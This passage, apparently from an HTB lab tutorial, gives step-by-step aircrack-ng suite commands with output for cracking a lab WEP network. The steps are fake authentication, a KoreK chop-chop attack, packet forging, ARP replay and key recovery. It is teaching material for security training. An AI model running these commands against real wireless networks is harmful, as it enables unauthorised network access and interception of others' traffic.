In this scenario, we can perform a special `Fragmentation` or `KoreK chop chop` attack in combination with [fake authentication](https://www.aircrack-ng.org/doku.php?id=fake_authentication).

We will need three terminals for this attack. In the first terminal, we scan the target network and capture its communications using `airodump-ng`.

```sh
3kjS@htb[/htb]$ sudo airodump-ng -c 3 --bssid 60:38:E0:71:E9:DC wlan0mon -w WEP
```

Once this is running, in our second terminal we will begin packet crafting attempts. We employ the following command, specifying fake authentication with `-1`, the re-association interval with `1000`, the ESSID of the network with `-e`, the BSSID with `-a`, our MAC address with `-h`, and the keep-alive request interval with `-q`. Additionally, we use `-o 1` to send only one set of packets at a time.

```sh
3kjS@htb[/htb]$ aireplay-ng -1 1000 -o 1 -q 5 -e HTB-Wireless -a 60:38:E0:71:E9:DC -h 00:c0:ca:98:3e:e0 wlan0mon

Sending Authentication Request
Authentication successful
Sending Association Request
Association successful :-)
```

**Note:** `We supply our own interface's MAC address (00:c0:ca:98:3e:e0) as the attacker.`
  
In the `airodump-ng` output, we can confirm that fake authentication was successful as our MAC address now appears as a client connected to the AP.

```sh
3kjS@htb[/htb]$ sudo airodump-ng -c 3 --bssid 60:38:E0:71:E9:DC wlan0mon -w WEP
```

Then, in a third terminal, we initiate either a fragmentation or KoreK chop chop attack. To start a KoreK chop chop attack, we use the following command, specifying the access point's BSSID with `-b` and our interface's MAC address with `-h`.

```sh
3kjS@htb[/htb]$ aireplay-ng -4 -b 60:38:E0:71:E9:DC -h 00:c0:ca:98:3e:e0 wlan0mon
```

```sh
3kjS@htb[/htb]$ packetforge-ng -0 -a 60:38:e0:71:e9:dc -h 00:c0:ca:98:3e:e0 -k 192.168.1.1 -l 192.168.1.64 -y replay_dec-1229-160018.xor -w forgedarp.cap

Wrote packet to: forgedarp.cap
```

```sh
3kjS@htb[/htb]$ aireplay-ng -2 -r forgedarp.cap wlan0mon

        Size: 68, FromDS: 0, ToDS: 1 (WEP)

              BSSID  =  60:38:E0:71:E9:DC
          Dest. MAC  =  FF:FF:FF:FF:FF:FF
         Source MAC  =  00:c0:ca:98:3e:e0
Use this packet ? y
```

```sh
3kjS@htb[/htb]$ sudo aircrack-ng -b 60:38:E0:71:E9:DC WEP-01.cap
```
